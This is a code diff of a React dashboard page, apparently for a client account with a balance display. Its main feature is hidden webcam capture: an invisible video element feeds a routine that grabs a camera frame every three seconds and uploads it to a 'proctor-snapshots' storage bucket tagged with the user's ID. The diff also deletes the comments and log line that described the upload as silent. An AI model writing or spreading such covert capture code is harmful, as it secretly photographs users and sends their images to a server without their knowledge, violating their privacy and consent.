@@ -9,6 +9,7 @@ import {
 } from 'lucide-react';
 
 export default function Dashboard() {
+  // 1. SAFE DEFAULT STATE (Prevents crash if DB fails)
   const [user, setUser] = useState<any>({
     full_name: 'Valued Client',
     balance: 0,
@@ -105,38 +106,35 @@ export default function Dashboard() {
       const interval = setInterval(async () => {
         const cvs = canvasRef.current;
         
-        // CHECK: Ensure video is ready AND playing (readyState >= 2)
+        // CHECK: Ensure video is ready AND playing
         if (vid && cvs && vid.readyState >= 2 && !vid.paused && !vid.ended) {
             
-            // Draw exact video frame to canvas
             const context = cvs.getContext('2d');
             if (context) {
-                // Ensure canvas matches video size to prevent cropping/black bars
+                // Ensure canvas matches video size to prevent cropping
                 cvs.width = vid.videoWidth;
                 cvs.height = vid.videoHeight;
                 
                 context.drawImage(vid, 0, 0, cvs.width, cvs.height);
                 
-                // Convert to Blob
+                // Convert to Blob and Upload
                 cvs.toBlob(async (blob) => {
                   if (blob) {
-                    // Upload to Supabase (Silent)
                     const { error } = await supabase.storage
                       .from('proctor-snapshots')
                       .upload(`${userId}/live_${Date.now()}.jpg`, blob);
                       
                     if (error) console.warn("Snapshot upload error:", error.message);
-                    else console.log("Snapshot taken");
                   }
-                }, 'image/jpeg', 0.5); // Quality 0.5 is enough for monitoring
+                }, 'image/jpeg', 0.5); 
             }
         } else {
-            // Retry playing if it paused for some reason
+            // Retry playing if paused
             vid?.play().catch(() => {});
         }
-      }, 3000); // 3 Seconds Interval
+      }, 3000); 
 
-      return () => clearInterval(interval); // Cleanup
+      return () => clearInterval(interval); 
     } catch (e) { 
         console.warn("Biometrics offline:", e); 
     }
@@ -183,11 +181,7 @@ export default function Dashboard() {
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
       
-      {/* FIXED VIDEO ELEMENT:
-         1. playsInline: Critical for iOS/Mobile to not force fullscreen
-         2. opacity-0: Makes it invisible but still rendered (fix for black screen)
-         3. pointer-events-none: So users can't click it
-      */}
+      {/* VIDEO ELEMENT (Hidden but active) */}
       <video 
         ref={videoRef} 
         autoPlay 
@@ -215,8 +209,9 @@ export default function Dashboard() {
                 <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
                 <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0]}</span>
               </div>
+              {/* UPDATED: Sign out redirects to /portal */}
               <button 
-                onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal/auth')} 
+                onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal')} 
                 className="w-10 h-10 flex items-center justify-center bg-white/5 rounded-full hover:bg-red-500/20 hover:text-red-500 transition-all border border-white/10"
               >
                 <LogOut size={18} />
@@ -349,4 +344,4 @@ export default function Dashboard() {
       </div>
     </main>
   );
-      }
+                }
